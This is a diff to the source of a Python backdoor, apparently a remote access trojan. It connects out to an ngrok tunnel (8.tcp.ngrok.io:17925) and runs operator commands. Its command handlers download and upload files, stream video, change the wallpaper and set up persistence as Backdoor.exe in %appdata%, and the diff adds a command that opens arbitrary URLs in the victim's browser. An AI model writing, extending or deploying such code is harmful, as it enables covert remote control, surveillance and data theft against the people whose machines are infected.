@@ -11,6 +11,7 @@ import subprocess
 import sys
 import threading
 import time
+import webbrowser
 
 import cv2
 import imutils
@@ -179,8 +180,7 @@ def stream(stop):
 
 def shell():
     stop_threads = False
-    stream_thread = threading.Thread(
-        target=stream, args=(lambda: stop_threads, ))
+    stream_thread = threading.Thread(target=stream, args=(lambda: stop_threads, ))
 
     while True:
         command = reliable_recv()
@@ -204,8 +204,11 @@ def shell():
                 pass
 
         elif command[:8] == "download":
-            with open(command[9:], "rb") as file:
-                send_file(file.read())
+            try:
+                with open(command[9:], "rb") as file:
+                    send_file(file.read())
+            except:
+                reliable_send("[!!] Failed to send file")
 
         elif command[:6] == "upload":
             with open(command[7:], "wb") as fin:
@@ -298,6 +301,17 @@ def shell():
             except:
                 reliable_send("[!!] Failed to change the wallpaper")
 
+        elif command[:10] == "webbrowser":
+            try:
+                url = command[11:]
+                res = webbrowser.open(url)
+                if res == True:
+                    reliable_send("[+] Web browser opened successfully")
+                else:
+                    reliable_send("[!!] Failed to open web browser")
+            except:
+                reliable_send("[!!] Failed to open web browser")
+
         elif command[:11] == "persistance":
             location = os.environ["appdata"] + "\\Backdoor.exe"
             if not os.path.exists(location):
@@ -338,7 +352,7 @@ def shell():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connection()
-sock.connect(("0.tcp.ngrok.io", 16597))  # ngrok tcp 9001
+sock.connect(("8.tcp.ngrok.io", 17925))  # ngrok tcp 9001
 print("connected")
 shell()
 sock.close()
